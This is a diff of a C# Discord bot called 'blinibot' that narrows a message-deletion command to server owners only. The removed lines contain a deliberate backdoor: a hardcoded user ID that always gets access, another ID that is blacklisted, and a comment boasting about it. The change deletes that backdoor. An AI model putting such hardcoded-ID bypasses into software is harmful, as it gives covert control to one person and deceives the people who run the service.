@@ -323,8 +323,7 @@ namespace blinibot
                 .Do(async (e) =>
                 {
                     //Check if the user is the server owner
-                    //Note: Matt Kenney is blacklisted and I gave myself a backdoor to always have access LUL
-                    if ((e.User.Id.Equals(e.Server.Owner.Id) && !e.User.Id.ToString().Equals("229396751537143820")) || (e.User.Id.ToString().Equals("189798240923680768")))
+                    if (e.User.Id.Equals(e.Server.Owner.Id))
                     {
                         Message[] messagesToDelete;
                         int n;
